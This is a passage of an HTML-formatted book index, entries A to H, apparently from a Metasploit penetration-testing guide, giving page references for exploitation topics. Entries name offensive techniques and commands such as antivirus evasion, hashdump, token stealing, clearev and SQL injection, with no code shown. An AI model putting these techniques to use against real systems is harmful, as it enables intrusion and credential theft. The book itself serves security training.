0pt;text-align: left;">A</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">active information gathering, 18–26 ActiveX control, malicious, 184 <span class="s56">add_group_user </span>command, 89, 279 Add/Remove Windows Components,</p><p class="s41" style="padding-left: 90pt;text-indent: 32pt;text-align: left;">Windows Components Wizard<span class="s42">, 269 Address Resolution Protocol (ARP),</span></p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">175–176</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><span class="s56">add_user </span>command, 89, 279 <span class="s41">Administrator </span>user account, 83 Adobe file format exploit, 141, 175 Adobe Flash, zero-day vulnerability,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">110, 146</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">advanced service enumeration, 19</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">airbase-ng <span class="s42">component, 179</span></p><p class="s56" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">-C 30 <span class="s42">option, 179</span></p><p class="s56" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">-v <span class="s42">option, 179</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Aircrack-ng website, 179</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">airmon-ng start wlan0 <span class="s42">command, 179 anonymous logins, </span><span class="s41">scanner/ftp/</span></p><p class="s41" style="padding-left: 90pt;text-indent: 32pt;text-align: left;">anonymous<span class="s42">, 29 antivirus</span></p><p class="s42" style="padding-left: 112pt;text-indent: -10pt;text-align: left;">avoiding detection from, 99–108 creating stand-alone binaries with</p><p class="s41" style="padding-left: 122pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfpayload<span class="s42">, 100–101</span></p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">encoding with <span class="s41">msfencode</span>, 102–103 using custom executable tem-</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">plates, 105–107</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">using multi-encoding, 103–104</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">using packers, 107–108</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">processes, killing, 282</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">APACHE_SERVER <span class="s42">flag, 137</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">API (application programming inter- face), for Meterpreter scripts, 241–244</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">base API calls, 242 Meterpreter mixins, 242–244</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">printing output, 241–242</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">Arduino interface, 159</p><p class="s41" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">armitage<span class="s42">, 11–12</span></p><p class="s42" style="padding-left: 50pt;text-indent: -32pt;text-align: left;">ARP (Address Resolution Protocol), 175–176</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">assembly languages, 216</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">attack vectors, 17, 136</p><p class="s42" style="padding-left: 50pt;text-indent: -32pt;text-align: left;">Attempt SQL Ping and Auto Quick Brute Force option, Fast-Track, 169–171</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">Aurora attack vector, 146 Authentication Mode, SQL Server, 270 <span class="s41">autoexploit.rc </span>file, 73</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">Automatic Targeting option, 62 Automatic Updates option,</p><p class="s42" style="padding-left: 17pt;text-indent: 32pt;text-align: left;">Windows XP, 269 Autopwn Automation menu, 164 <span class="s41">autopwn </span>exploits, 181</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Autopwn tool, using results in, 56</p><p class="s41" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">autorun.inf <span class="s42">file, 157</span></p><p class="s42" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">auxiliary class, 129</p><p class="s42" style="padding-left: 31pt;text-indent: 0pt;text-align: center;">auxiliary modules, 123–133</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: center;">anatomy of, 128–133</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">defined, 8</p><p class="s42" style="padding-left: 17pt;text-indent: 10pt;text-align: left;">in use, 126–128 Auxiliary <span class="s56">run </span>method, 31</p><p class="s56" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: center;">Auxiliary::Scanner <span class="s42">mixin, 31</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">B</p><p class="s56" style="padding-top: 3pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">back <span class="s42">command, 58</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">backdoored executable, 106</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">background <span class="s42">command, 86, 279 Back|Track</span></p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">downloading, 267–268</p><p class="s42" style="padding-left: 17pt;text-indent: 10pt;text-align: left;">updating, 272–274 bad characters</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;line-height: 10pt;text-align: left;">avoiding, 13</p><p class="s42" style="padding-left: 17pt;text-indent: 10pt;text-align: left;">and creating exploits, 210–213 banner grabbing, 19, 36</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Base64, 102, 189, 193–194</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">binaries, creating with <span class="s41">msfpayload</span>, 100–101</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Binary paste option, Immunity Debugger window, 113</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">binary-to-hex generator, Fast-Track tool, 174</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Binary to Hex Payload Converter,</p><p class="s42" style="padding-left: 90pt;text-indent: 32pt;text-align: left;">Fast-Track, 174 <span class="s41">bin/dict/wordlist.txt file</span>, Fast-Track, 169 bind shell, 8, 70</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">bind_tcp <span class="s42">format, 113</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">bind_tcp <span class="s42">payload, 281</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">blank password, 53, 84 Blowfish encryption algorithm,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RATTE, 160</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">breakpoint, in Immunity Debugger window, 113</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">browser_autopwn <span class="s42">server, 179</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">browser-based exploits, 110–112 browser exploit menu, <span class="s41">armitage</span>, 11–12 brute force attack, Apache Tomcat,</p><p class="s42" style="padding-left: 42pt;text-indent: 0pt;text-align: center;">260–261</p><p class="s42" style="padding-left: 42pt;text-indent: 0pt;text-align: center;">brute forcing ports, 71–72</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">buffer overflow exploits, porting to Metasploit, 216–226</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">adding randomization, 222–223</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">completed module, 224–226 configuring exploit definition,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">219–220</p><p class="s42" style="padding-left: 122pt;text-indent: -21pt;text-align: left;">implementing features of the Frame- work, 221–222</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">removing dummy shellcode, 223–224 removing NOP Slide, 223</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">stripping existing exploit, 218–219 testing base exploit, 220–221</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Burp Suite, 253</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">C</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">captive portal, Karmetasploit, 182</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">check <span class="s42">command, 276</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Check Names button, Login-New window, 272</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">CIDR (Classless Inter-Domain Routing) notation, 22, 44</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">clearev <span class="s42">command, 279</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">client.framework.payloads.create(payload)</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">function, 246</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">client-side attacks, 109–121</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">browser-based exploits, 110–112 file format exploits, 119–120</p><p class="s42" style="padding-top: 3pt;padding-left: 49pt;text-indent: -21pt;text-align: left;">Internet Explorer Aurora exploit, 116–119</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">sending malicious file, 120–121 web exploits, 146–148</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">cmd_exec(cmd) <span class="s42">function, 242</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">cmd <span class="s42">variable, 188</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">cnt <span class="s42">counter, 194</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">code reuse, and modules, 196</p><p class="s56" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Collab.collectEmailInfo <span class="s42">Adobe vulnerability, 139</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">commands</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">for Meterpreter, 80–82, 277–279</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">keystroke logging, 81–82</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">post exploitation, 282–283</p><p class="s56" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">screenshot <span class="s42">command, 80–81</span></p><p class="s56" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">sysinfo <span class="s42">command, 81</span></p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">for <span class="s41">msfcli</span>, 281</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">for <span class="s41">msfconsole</span>, 275–277</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">for <span class="s41">msfencode</span>, 280</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">for <span class="s41">msfpayload</span>, 280</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">command shell, dropping into, 283 Common Vulnerabilities and Expo-</p><p class="s42" style="padding-left: 16pt;text-indent: 32pt;text-align: left;">sures (CVE) numbers, 42 community strings, 30</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Conficker worm, 59</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">connect <span class="s42">command, 9</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Convert::ToByte<span class="s42">, 193 copycat domain name, 142</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">covert penetration testing, 4, 5</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">credentialed scan, 43</p><p class="s56" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Credential Harvester <span class="s42">option, SET main menu, 149</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">credential harvesting, 149, 153–154,</p><p class="s42" style="padding-left: 22pt;text-indent: 0pt;text-align: center;">181–182</p><p class="s42" style="padding-left: 21pt;text-indent: 0pt;text-align: center;">cross-site scripting (XSS)</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;text-align: center;">vulnerability, 150</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">C-style output, 12</p><p class="s57" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">CTRL<span class="s42">-C shortcut, 149</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;"><span class="s57">CTRL</span>-W shortcut, in <span class="s56">Nano</span>, 188</p><p class="s57" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">CTRL<span class="s42">-Z shortcut, 86, 97</span></p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">custom scanners, for intelligence gathering, 31–33</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">CVE (Common Vulnerabilities and Exposures) numbers, 42</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">D</p><p class="s42" style="padding-top: 3pt;padding-left: 16pt;text-indent: 0pt;text-align: left;">Dai Zovi, Dino, 177</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">databases, working with in Metasploit, 20–25</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Data Execution Prevention (DEP), 65</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">data/templates/template.exe <span class="s42">template, 105</span></p><p class="s56" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">db_autopwn <span class="s42">command, 56, 277</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">db_connect <span class="s42">command, 42, 43, 48, 49,</span></p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">56, 277</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">db_create <span class="s58">name </span><span class="s42">command, 277</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">db_destroy <span class="s42">command, 43, 49, 277</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">db_hosts <span class="s42">command, 21–22, 27, 42, 44,</span></p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">48, 51</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">db_import <span class="s42">command, 21, 42, 48, 56</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">db_nmap <span class="s42">command, 24, 277 db_owner role membership, User</span></p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">Properties window, 272</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">db_services <span class="s42">command, 25</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">db_status <span class="s42">command, 20</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">db_vulns <span class="s42">command, 44, 49</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">debug <span class="s42">command, 192</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Defcon 18 Hacking Conference, 185</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">def exploit <span class="s42">line, 191</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">def inject <span class="s42">function, 238</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">def powershell_upload_exec <span class="s42">function, 192 DEP (Data Execution Prevention), 65 desktop screen captures, 80</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">DHCP (Dynamic Host Configuration Protocol) server, 178</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">dhcpd.conf <span class="s42">file, 178</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">DistCC, 263</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">DNS (Domain Name System), 17, 175 domain administrator token,</p><p class="s42" style="padding-left: 90pt;text-indent: 32pt;text-align: left;">stealing, 282 Domain Admins group, 282</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Domain Name System (DNS), 17, 175</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">download <span class="s58">file </span><span class="s42">command, 279 Drake, Joshua, 79</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">drop_token <span class="s42">command, 278</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">dummy shellcode, 222, 230–231 dumping password hashes, 83–84 Dynamic Host Configuration Protocol</p><p class="s42" style="padding-left: 90pt;text-indent: 32pt;text-align: left;">(DHCP) server, 178 dynamic memory allocation, 70 dynamic ports, 168</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">E</p><p class="s56" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">eb <span class="s42">operation code, 209 egg hunter, 204</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">EHLO <span class="s42">command, 219</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">EIP (extended instruction pointer) register, 216, 217, 219, 220</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Encase, 265</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">-EncodedCommand <span class="s42">command, 193, 194</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">encoders, 13</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">endian-ness, 207, 221</p><p class="s42" style="padding-top: 3pt;padding-left: 18pt;text-indent: 0pt;text-align: left;">error message, SQL injection, 255 ESP registers, 216</p><p class="s42" style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;">ESSID, 179</p><p class="s56" style="padding-left: 50pt;text-indent: -32pt;text-align: left;">/etc/dhcp3/dhcpd.conf/ etc/dhcp3/ dhcpd.conf.back <span class="s42">command, 178</span></p><p class="s42" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">Ettercap, 175</p><p class="s56" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">eventlog_clear(evt = &quot;&quot;) <span class="s42">function, 242</span></p><p class="s56" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">eventlog_list() <span class="s42">function, 242</span></p><p class="s41" style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;">event_manager <span class="s42">tool, 265</span></p><p class="s56" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">evil <span class="s42">string, 207 Excellent ranking</span></p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">Autopwn tool, 56</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">encoders, 13</p><p class="s56" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">exe <span class="s42">command, 192</span></p><p class="s56" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">execute -f cmd.exe <span class="s42">command, 278</span></p><p class="s41" style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;">execute_upload.rb <span class="s42">file, 244</span></p><p class="s42" style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;">exploitation, 57–73</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">brute forcing ports, 71–72 client-side attacks, 109–121</p><p class="s42" style="padding-left: 39pt;text-indent: 0pt;text-align: left;">browser-based exploits, 110–112 file format exploits, 119–120 Internet Explorer Aurora exploit,</p><p class="s42" style="padding-left: 50pt;text-indent: 0pt;text-align: left;">116–119</p><p class="s42" style="padding-left: 28pt;text-indent: 10pt;text-align: left;">sending a malicious file, 120–121 creating exploits, 197–213</p><p class="s42" style="padding-left: 39pt;text-indent: 0pt;text-align: left;">and bad characters, 210–213 controlling SEH, 201–203</p><p class="s42" style="padding-left: 39pt;text-indent: 0pt;text-align: left;">and fuzzing, 198–201 getting return address for,</p><p class="s42" style="padding-left: 50pt;text-indent: 0pt;text-align: left;">206–210</p><p class="s42" style="padding-left: 28pt;text-indent: 10pt;text-align: left;">and SEH restrictions, 204–206 defined, 8</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">phase of PTES, 3 resource files for, 72–73</p><p class="s42" style="padding-left: 50pt;text-indent: -21pt;text-align: left;">simulated penetration test, 255, 257–260</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;line-height: 10pt;text-align: left;">for Ubuntu, 68–71</p><p class="s42" style="padding-left: 1pt;text-indent: 0pt;text-align: center;">for Windows XP SP2, 64–68</p><p class="s56" style="text-indent: 0pt;text-align: center;">exploit <span class="s42">command, 68, 70, 91, 97,</span></p><p class="s42" style="padding-left: 23pt;text-indent: 0pt;text-align: center;">187, 276</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: center;">Exploit Database site, 198</p><p class="s41" style="padding-left: 50pt;text-indent: -32pt;text-align: left;">exploit-db<span class="s42">, to identify potential vulnerabilities, 260</span></p><p class="s42" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">exploit module, 8</p><p class="s56" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">exploit <span class="s42">section, 206</span></p><p class="s42" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">Exploits Database, 264</p><p class="s42" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">Exploits menu, 164</p><p class="s41" style="padding-left: 18pt;text-indent: 0pt;line-height: 11pt;text-align: left;">explorer.exe <span class="s42">process, 82</span></p><p class="s42" style="padding-left: 50pt;text-indent: -32pt;text-align: left;">extended instruction pointer (EIP) register, 216, 217, 219, 220</p><p class="s42" style="padding-left: 18pt;text-indent: 0pt;line-height: 10pt;text-align: left;">extracting password hashes, 82–83</p><p class="s55" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">F</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">false negatives, in vulnerability scans, 36 false positives, in vulnerability scans, 36 <span class="s56">fasttrack-launching </span>command, 163</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Fast-Track tool, 163–176</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">binary-to-hex generator, 174</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">defined, 79 main menu</p><p class="s56" style="padding-left: 112pt;text-indent: 0pt;line-height: 11pt;text-align: left;">BLIND <span class="s42">SQL Injection attacks, 173</span></p><p class="s56" style="padding-left: 122pt;text-indent: -10pt;text-align: left;">ERROR BASED <span class="s42">SQL Injection attacks, 173</span></p><p class="s56" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">Mass Client-Side Attack <span class="s42">option, 75</span></p><p class="s56" style="padding-left: 122pt;text-indent: -10pt;text-align: left;">Metasploit Meterpreter Reflective Reverse TCP <span class="s42">option, 173</span></p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">mass client-side attack, 175–176 Microsoft SQL injection with,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">164–174</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">manual injection, 167–168</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">MSSQL Bruter, 168–172</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">POST parameter attack, 166–167 query string attack, 165–166 <span class="s56">SQLPwnage</span>, 172–174</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">file exploits</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">file format exploits, 119–120 sending a malicious file, 120–121</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">file format vulnerability, 121 File Transfer Protocol (FTP)</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanning, 29</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">service, 269</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Find SQL Ports option, Fast-Track, 169 fingerprinting targets, 5</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Follow address in stack option,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">Immunity Debugger, 201</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">forensics analysis, 264</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Foursquare credentials, 132</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Foursquare service, 132</p><p class="s42" style="padding-left: 101pt;text-indent: -10pt;text-align: left;">FTP (File Transfer Protocol) scanning, 29</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 10pt;text-align: left;">service, 269</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">FTP (File Transfer Protocol) Service checkbox, 269</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">ftp_version <span class="s42">module, 29</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Furr, Joey, 163</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">fuzzed <span class="s42">variable, 199</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">fuzzers <span class="s42">directory, 124</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">fuzzing, 198–201</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">fuzz string, 199</p><p class="s55" style="padding-top: 4pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">G</p><p class="s42" style="padding-top: 3pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">Gates, Chris, 129</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">generate_seh_payload <span class="s42">function, 230</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">generic/debug_trap <span class="s42">payload, 208, 220</span></p><p class="s41" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">getgui <span class="s42">script, 257</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">GET HTTP <span class="s42">request, 36</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">getprivs <span class="s42">command, 279</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">getsystem <span class="s42">command, 86, 119, 249,</span></p><p class="s42" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">278, 282</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">getuid <span class="s42">command, 86 Google, to identify potential</span></p><p class="s42" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">vulnerabilities, 260</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">H</p><p class="s56" style="padding-top: 3pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">h2b <span class="s42">conversion method, 193 Hadnagy, Chris, 135</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">hashdump <span class="s42">command, 83, 84, 93, 95,</span></p><p class="s42" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">279, 282</p><p class="s41" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">hashdump <span class="s42">post exploitation module, 82 haystack, 111</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">heap, 111</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">heap-based attack, 70</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">heap spraying technique, 111</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">help <span class="s42">command, 9, 43, 80, 277</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">hex-blob, 185</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">host_process.memory.allocate <span class="s42">function, 238</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">host_process.memory.write <span class="s42">function, 239</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: center;">host_process.thread.create <span class="s42">function, 239 HTTP (HyperText Transfer Protocol) man-left-in-the-middle attack, 150</span></p><p class="s56" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">PUT <span class="s42">command, 264</span></p><p class="s56" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">PUT <span class="s42">method, 261</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">HVE, Patrick, 97</p><p class="s42" style="padding-left: 